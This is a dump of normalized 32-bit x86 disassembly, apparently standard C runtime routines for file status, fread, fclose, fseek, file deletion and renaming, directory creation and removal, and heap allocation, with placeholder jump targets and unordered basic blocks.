cmp edi ebx
je r-xdata
call sub_4119ce
mov [ eax ] ebx
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
jmp r-xdata
push r--data
push esi
call sub_412cbb
pop ecx
pop ecx
test eax eax
je r-xdata
or eax 0xffffffff
cmp [ esi + 0x2 ] 0x3a
jne r-xdata
call sub_4119bb
push 0x2
pop esi
mov [ eax ] esi
call sub_4119ce
mov [ eax ] esi
jmp r-xdata
call sub_418ddf
movzx eax [ esi ]
cmp ax bx
je r-xdata
cmp [ ebp - 0x448 ] ebx
jne r-xdata
push r--data
push esi
mov [ ebp - 0x460 ] ebx
call sub_412cbb
pop ecx
pop ecx
test eax eax
je r-xdata
push eax
call sub_418f5d
movzx eax ax
pop ecx
sub eax 0x60
jmp r-xdata
cmp [ esi + 0x4 ] bx
je r-xdata
lea eax [ ebp - 0x478 ]
push eax
lea eax [ ebp - 0x448 ]
push eax
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x444 ] ebx
jne r-xdata
lea eax [ ebp - 0x460 ]
push eax
push 0x104
lea eax [ ebp - 0x20c ]
push esi
push eax
call sub_411aa5
mov esi eax
add esp 0x10
cmp esi ebx
je r-xdata
mov [ ebp - 0x47c ] eax
lea eax [ ebp - 0x45c ]
push eax
push esi
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x460 ] eax
cmp eax 0xffffffff
jne r-xdata
call [ GetLastError@IAT ]
push eax
call sub_4119e1
pop ecx
push [ ebp - 0x460 ]
call [ FindClose@IAT ]
lea eax [ ebp - 0x470 ]
push eax
lea eax [ ebp - 0x478 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test eax eax
je r-xdata
mov [ edi + 0x20 ] ebx
mov [ edi + 0x24 ] ebx
jmp r-xdata
cmp [ ebp - 0x460 ] ebx
je r-xdata
push esi
call sub_411794
pop ecx
cmp eax 0x3
je r-xdata
movzx eax [ ebp - 0x464 ]
push 0xffffffff
push eax
movzx eax [ ebp - 0x466 ]
push eax
movzx eax [ ebp - 0x468 ]
push eax
movzx eax [ ebp - 0x46a ]
push eax
movzx eax [ ebp - 0x46e ]
push eax
movzx eax [ ebp - 0x470 ]
push eax
call sub_418b74
add esp 0x1c
mov [ edi + 0x20 ] eax
mov [ edi + 0x24 ] edx
cmp [ ebp - 0x450 ] ebx
jne r-xdata
push [ ebp - 0x460 ]
call sub_4121b5
pop ecx
jmp r-xdata
push esi
call [ GetDriveTypeW@IAT ]
cmp eax 0x1
jbe r-xdata
call sub_411a04
test eax eax
je r-xdata
lea eax [ ebp - 0x478 ]
push eax
lea eax [ ebp - 0x450 ]
push eax
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x44c ] ebx
jne r-xdata
cmp [ ebp - 0x460 ] ebx
je r-xdata
lea eax [ ebp - 0x470 ]
push eax
lea eax [ ebp - 0x478 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test eax eax
je r-xdata
mov eax [ edi + 0x20 ]
mov [ edi + 0x18 ] eax
mov eax [ edi + 0x24 ]
mov [ edi + 0x1c ] eax
jmp r-xdata
push 0xffffffff
push ebx
push ebx
push ebx
push 0x1
xor eax eax
push 0x1
push 0x7bc
mov [ ebp - 0x45c ] 0x10
mov [ ebp - 0x440 ] ebx
mov [ ebp - 0x43c ] ebx
mov [ ebp - 0x430 ] ax
call sub_418b74
mov esi [ ebp - 0x474 ]
mov ecx edx
add esp 0x1c
mov [ edi + 0x20 ] eax
mov [ edi + 0x24 ] edx
mov [ edi + 0x18 ] eax
mov [ edi + 0x1c ] ecx
mov [ edi + 0x28 ] eax
mov [ edi + 0x2c ] ecx
jmp r-xdata
push [ ebp - 0x460 ]
call sub_4121b5
pop ecx
movzx eax [ ebp - 0x464 ]
push 0xffffffff
push eax
movzx eax [ ebp - 0x466 ]
push eax
movzx eax [ ebp - 0x468 ]
push eax
movzx eax [ ebp - 0x46a ]
push eax
movzx eax [ ebp - 0x46e ]
push eax
movzx eax [ ebp - 0x470 ]
push eax
call sub_418b74
add esp 0x1c
mov [ edi + 0x18 ] eax
mov [ edi + 0x1c ] edx
cmp [ ebp - 0x458 ] ebx
jne r-xdata
push esi
push [ ebp - 0x45c ]
call sub_418ab1
mov [ edi + 0x6 ] ax
xor eax eax
inc eax
mov [ edi + 0x8 ] ax
mov eax [ ebp - 0x43c ]
mov [ edi + 0x14 ] eax
xor eax eax
mov [ edi + 0x4 ] ax
mov [ edi + 0xc ] ax
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x47c ]
dec eax
pop ecx
mov [ edi ] eax
mov [ edi + 0x10 ] eax
pop ecx
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x478 ]
push eax
lea eax [ ebp - 0x458 ]
push eax
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x454 ] ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_411f81
leave
retn
lea eax [ ebp - 0x470 ]
push eax
lea eax [ ebp - 0x478 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test eax eax
je r-xdata
mov eax [ edi + 0x20 ]
mov [ edi + 0x28 ] eax
mov eax [ edi + 0x24 ]
mov [ edi + 0x2c ] eax
jmp r-xdata
movzx eax [ ebp - 0x464 ]
push 0xffffffff
push eax
movzx eax [ ebp - 0x466 ]
push eax
movzx eax [ ebp - 0x468 ]
push eax
movzx eax [ ebp - 0x46a ]
push eax
movzx eax [ ebp - 0x46e ]
push eax
movzx eax [ ebp - 0x470 ]
push eax
call sub_418b74
add esp 0x1c
mov [ edi + 0x28 ] eax
mov [ edi + 0x2c ] edx
push [ ebp - 0x460 ]
call [ FindClose@IAT ]
sub_411ee0
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
test [ ebp + 0xc ] 0xfffffff9
jne r-xdata
call sub_4119ce
mov [ eax ] esi
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
push 0x16
pop eax
jmp r-xdata
push [ ebp + 0x8 ]
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
jne r-xdata
pop esi
pop ebp
retn
test al 0x10
jne r-xdata
call [ GetLastError@IAT ]
push eax
call sub_4119e1
pop ecx
xor eax eax
test al 0x1
je r-xdata
test [ ebp + 0xc ] 0x2
je r-xdata
call sub_4119ce
mov [ eax ] 0x5
call sub_4119bb
mov [ eax ] 0xd
jmp r-xdata
call sub_4119bb
mov eax [ eax ]
jmp r-xdata
sub_411f90
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp eax 0x3fffffff
jbe r-xdata
cmp esi ebx
jne r-xdata
pop ebx
leave
retn
add eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop edi
dec [ ebp - 0x1c ]
js r-xdata
push edi
push [ ebp + 0x18 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_419285
add esp 0x10
mov edi eax
cmp esi ebx
je r-xdata
pop esi
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_419079
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_419079
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
mov eax edi
sub_412081
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ MoveFileW@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
xor eax eax
pop ebp
retn
push eax
call sub_4119e1
pop ecx
or eax 0xffffffff
pop ebp
retn
test eax eax
je r-xdata
sub_4120b4
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteFileW@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
xor eax eax
pop ebp
retn
push eax
call sub_4119e1
pop ecx
or eax 0xffffffff
pop ebp
retn
test eax eax
je r-xdata
sub_4120e4
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
push [ ebp + 0x8 ]
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
jne r-xdata
call sub_4119ce
mov [ eax ] esi
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
test [ ebp + 0xc ] 0x80
je r-xdata
call [ GetLastError@IAT ]
push eax
call sub_4119e1
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
or eax 0x1
and eax 0xfffffffe
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
push eax
push [ ebp + 0x8 ]
call [ SetFileAttributesW@IAT ]
test eax eax
je r-xdata
sub_412153
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call [ CreateDirectoryW@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
xor eax eax
pop ebp
retn
push eax
call sub_4119e1
pop ecx
or eax 0xffffffff
pop ebp
retn
test eax eax
je r-xdata
sub_412185
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ RemoveDirectoryW@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
xor eax eax
pop ebp
retn
push eax
call sub_4119e1
pop ecx
or eax 0xffffffff
pop ebp
retn
test eax eax
je r-xdata
sub_4121b5
push 0xc
push r--data
call sub_4183f0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_418435
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_419f99
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_419fcc
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_4119bb
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_411979
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41220b
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_419ffc
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_412243
push [ rw-data ]
call sub_417df1
pop ecx
test eax eax
je r-xdata
push 0x19
call sub_417457
push 0x1
push 0x0
call sub_41aba7
add esp 0xc
jmp sub_41aa90
call eax
sub_412278
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
xor edi edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x10 ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] edi
je r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x18 ]
cmp esi edi
je r-xdata
call sub_4119bb
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
push edi
cmp ebx 0xffffffff
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp [ ebp + 0x14 ] eax
jbe r-xdata
cmp esi edi
je r-xdata
push ebx
push edi
push ecx
call sub_412f80
add esp 0xc
mov edi [ ebp + 0x10 ]
imul edi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x10 ] edi
mov ebx edi
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp [ ebp + 0x14 ] eax
ja r-xdata
mov [ ebp - 0xc ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
test [ esi + 0xc ] 0x10c
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0xc ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_41abd7
pop ecx
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
jl r-xdata
mov eax edi
sub eax ebx
xor edx edx
div [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
cmp ebx eax
ja r-xdata
mov ecx 0x7fffffff
xor edx edx
cmp ebx ecx
jbe r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
mov ecx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov [ ecx ] al
mov eax [ esi + 0x18 ]
dec ebx
dec [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
cmp eax [ ebp - 0x4 ]
ja r-xdata
mov eax ebx
mov eax ebx
div [ ebp - 0xc ]
mov eax ebx
mov eax ecx
div [ ebp - 0xc ]
mov eax ecx
jmp r-xdata
cmp edi [ ebp - 0x4 ]
ja r-xdata
mov edi eax
call sub_4119bb
mov [ eax ] 0x22
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_412f80
add esp 0xc
push eax
push [ ebp - 0x8 ]
push esi
call sub_41b3c1
pop ecx
push eax
call sub_41b2c4
add esp 0xc
test eax eax
je r-xdata
sub eax edx
jmp r-xdata
xor esi esi
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
push edi
push [ esi ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_41b3f3
sub [ esi + 0x4 ] edi
add [ esi ] edi
add [ ebp - 0x8 ] edi
sub ebx edi
add esp 0x10
sub [ ebp - 0x4 ] edi
mov edi [ ebp - 0x10 ]
jmp r-xdata
call sub_41897d
add esp 0x14
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
call sub_4119bb
push esi
push esi
push esi
push esi
mov [ eax ] 0x22
push esi
jmp r-xdata
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_412f80
add esp 0xc
test ebx ebx
jne r-xdata
add [ ebp - 0x8 ] eax
sub ebx eax
sub [ ebp - 0x4 ] eax
jmp r-xdata
sub_412482
push 0xc
push r--data
call sub_4183f0
xor esi esi
mov [ ebp - 0x1c ] esi
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
je r-xdata
cmp [ ebp + 0x18 ] esi
jne r-xdata
push [ ebp + 0x18 ]
call sub_4136e6
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_412278
add esp 0x14
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41250e
mov eax [ ebp - 0x1c ]
jmp r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
call sub_418435
retn
call sub_4119bb
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_41897d
add esp 0x14
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_412f80
add esp 0xc
sub_412535
push 0xc
push r--data
call sub_4183f0
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_418435
retn
push 0x4
call sub_419f99
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_41a7ab
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41257b
sub_412584
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_41b47f
pop ecx
call sub_4119bb
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
mov edi [ HeapAlloc@IAT ]
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_417602
push 0x1e
call sub_417457
push 0xff
call sub_416f71
cmp eax 0x3
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
push esi
call sub_412535
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
mov eax esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
inc esi
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push [ rw-data ]
call edi
push eax
jmp r-xdata
pop edi
mov eax ebx
pop ebx
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
pop esi
pop ebp
retn
call sub_4119bb
mov [ eax ] esi
push [ ebp + 0x8 ]
call sub_41b47f
pop ecx
test eax eax
je r-xdata
call sub_4119bb
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
sub_41264e
push 0x5c
push r--data
call sub_4183f0
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
push 0x30
push edi
push esi
call sub_412f80
add esp 0xc
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
call sub_4119ce
mov [ eax ] edi
call sub_4119bb
mov [ eax ] 0x16
cmp ecx edi
jl r-xdata
call sub_4119ce
mov [ eax ] edi
call sub_4119bb
mov [ eax ] 0x9
jmp r-xdata
call sub_418435
retn
call sub_4119ce
mov [ eax ] edi
call sub_4119bb
mov [ eax ] 0x9
jmp r-xdata
cmp ecx [ rw-data ]
jb r-xdata
or eax 0xffffffff
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_41897d
add esp 0x14
mov eax ecx
sar eax 0x5
lea eax [ eax * 4 + rw-data ]
mov [ ebp + 0xc ] eax
mov ebx ecx
and ebx 0x1f
shl ebx 0x6
mov eax [ eax ]
movsx eax [ eax + ebx + 0x4 ]
and eax 0x1
je r-xdata
push ecx
call sub_41b625
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
add eax ebx
test [ eax + 0x4 ] 0x1
jne r-xdata
push [ eax ]
call [ GetFileType@IAT ]
and eax 0xffff7fff
cmp eax 0x1
je r-xdata
call sub_4119bb
mov [ eax ] 0x9
xor eax eax
mov [ esi + 0x6 ] ax
mov [ esi + 0xc ] ax
mov [ esi + 0xa ] ax
mov [ esi + 0x4 ] ax
inc eax
mov [ esi + 0x8 ] ax
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
push [ eax + ebx ]
call [ GetFileInformationByHandle@IAT ]
test eax eax
je r-xdata
cmp eax 0x2
je r-xdata
call [ GetLastError@IAT ]
push eax
call sub_4119e1
pop ecx
jmp r-xdata
movzx eax [ esi + 0x6 ]
test [ ebp - 0x6c ] 0x1
je r-xdata
mov ecx 0x2000
jmp r-xdata
cmp eax 0x3
je r-xdata
or [ ebp - 0x1c ] 0xffffffff
or eax 0x1b6
or eax 0x124
jmp r-xdata
mov [ esi + 0x6 ] cx
mov ecx [ ebp + 0x8 ]
mov [ esi ] ecx
mov [ esi + 0x10 ] ecx
xor ecx ecx
inc ecx
mov [ esi + 0x8 ] cx
xor ecx ecx
mov [ esi + 0x4 ] cx
mov [ esi + 0xc ] cx
mov [ esi + 0xa ] cx
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
cmp eax 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp eax edi
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x54 ] edi
jne r-xdata
mov [ esi + 0x6 ] ax
cmp [ ebp - 0x58 ] edi
jne r-xdata
push edi
lea eax [ ebp + 0xc ]
push eax
push edi
push edi
push edi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
push [ eax + ebx ]
call [ PeekNamedPipe@IAT ]
neg eax
sbb eax eax
and eax [ ebp + 0xc ]
mov [ esi + 0x14 ] eax
jmp r-xdata
mov [ esi + 0x14 ] edi
jmp r-xdata
mov ecx 0x1000
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test eax eax
je r-xdata
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41299b
mov eax [ ebp - 0x1c ]
push 0xffffffff
movzx eax [ ebp - 0x2c ]
push eax
movzx eax [ ebp - 0x2e ]
push eax
movzx eax [ ebp - 0x30 ]
push eax
movzx eax [ ebp - 0x32 ]
push eax
movzx eax [ ebp - 0x36 ]
push eax
movzx eax [ ebp - 0x38 ]
push eax
call sub_418b74
add esp 0x1c
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] edx
cmp [ ebp - 0x60 ] edi
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x5c ] edi
jne r-xdata
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x20 ]
mov [ esi + 0x18 ] eax
mov eax [ esi + 0x24 ]
mov [ esi + 0x1c ] eax
jmp r-xdata
push 0xffffffff
movzx eax [ ebp - 0x2c ]
push eax
movzx eax [ ebp - 0x2e ]
push eax
movzx eax [ ebp - 0x30 ]
push eax
movzx eax [ ebp - 0x32 ]
push eax
movzx eax [ ebp - 0x36 ]
push eax
movzx eax [ ebp - 0x38 ]
push eax
call sub_418b74
add esp 0x1c
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
cmp [ ebp - 0x68 ] edi
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x68 ]
push eax
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x64 ] edi
jne r-xdata
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x20 ]
mov [ esi + 0x28 ] eax
mov eax [ esi + 0x24 ]
mov [ esi + 0x2c ] eax
jmp r-xdata
push 0xffffffff
movzx eax [ ebp - 0x2c ]
push eax
movzx eax [ ebp - 0x2e ]
push eax
movzx eax [ ebp - 0x30 ]
push eax
movzx eax [ ebp - 0x32 ]
push eax
movzx eax [ ebp - 0x36 ]
push eax
movzx eax [ ebp - 0x38 ]
push eax
call sub_418b74
add esp 0x1c
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] edx
mov eax [ ebp - 0x48 ]
mov [ esi + 0x14 ] eax
movzx eax [ esi + 0x6 ]
or eax 0x8000
mov [ esi + 0x6 ] ax
mov [ esi ] edi
mov [ esi + 0x10 ] edi
jmp r-xdata
sub_4129a5
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
or ebx 0xffffffff
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_4119bb
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
or eax ebx
jmp r-xdata
mov [ esi + 0xc ] edi
mov eax ebx
push esi
call sub_415bbb
push esi
mov ebx eax
call sub_41b9ef
push esi
call sub_41b3c1
push eax
call sub_41b922
add esp 0x10
test eax eax
jge r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
or ebx 0xffffffff
jmp r-xdata
push eax
call sub_4121b5
pop ecx
mov [ esi + 0x1c ] edi
sub_412a1c
push 0xc
push r--data
call sub_4183f0
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
setne al
cmp eax edi
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_4119bb
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_41897d
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
call sub_4136e6
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_4129a5
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_412a90
jmp r-xdata
mov [ esi + 0xc ] edi
call sub_418435
retn
mov eax [ ebp - 0x1c ]
sub_412a98
push 0xc
push r--data
call sub_4183f0
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov ebx [ ebp + 0x8 ]
cmp ebx esi
setne al
cmp eax esi
jne r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
cmp edi esi
setne al
cmp eax esi
je r-xdata
call sub_4119bb
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_41897d
add esp 0x14
xor eax eax
cmp [ edi ] si
setne al
cmp eax esi
je r-xdata
call sub_418435
retn
call sub_41bcd4
mov [ ebp + 0x8 ] eax
cmp eax esi
jne r-xdata
mov [ ebp - 0x4 ] esi
cmp [ ebx ] si
jne r-xdata
call sub_4119bb
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push edi
push ebx
call sub_41ba20
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_412b54
mov eax [ ebp - 0x1c ]
call sub_4119bb
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_41be0c
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_412b75
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
jne r-xdata
and eax 0xffffffef
cmp [ ebp + 0x10 ] 0x1
mov [ esi + 0xc ] eax
jne r-xdata
call sub_4119bb
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
push esi
call sub_415bbb
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_415e88
add [ ebp + 0xc ] eax
and [ ebp + 0x10 ] 0x0
pop ecx
pop esi
pop ebp
retn
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_41b3c1
pop ecx
push eax
call sub_41bfd4
xor ecx ecx
add esp 0xc
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
test al 0x8
je r-xdata
test eax 0x400
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_412bff
push 0xc
push r--data
call sub_4183f0
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
mov edi [ ebp + 0x10 ]
cmp edi esi
je r-xdata
call sub_4119bb
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_41897d
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_4136e6
pop ecx
mov [ ebp - 0x4 ] esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_412b75
add esp 0xc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_412c7a
mov eax [ ebp - 0x1c ]
cmp edi 0x1
je r-xdata
call sub_418435
retn
cmp edi 0x2
jne r-xdata
sub_412c84
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
jmp r-xdata
movzx ecx [ esi ]
movzx eax [ edx ]
movzx edi cx
sub eax edi
je r-xdata
test cx cx
je r-xdata
pop edi
pop esi
test eax eax
jge r-xdata
inc edx
inc edx
inc esi
inc esi
jle r-xdata
or eax 0xffffffff
pop ebp
retn
pop ebp
retn
xor eax eax
inc eax
sub_412cbb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
movzx edx [ eax ]
push ebx
push esi
push edi
test dx dx
je r-xdata
xor eax eax
mov ebx [ ebp + 0xc ]
movzx edi [ ebx ]
inc eax
inc eax
movzx edx [ eax ]
test dx dx
jne r-xdata
movzx ecx di
mov esi ebx
test di di
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
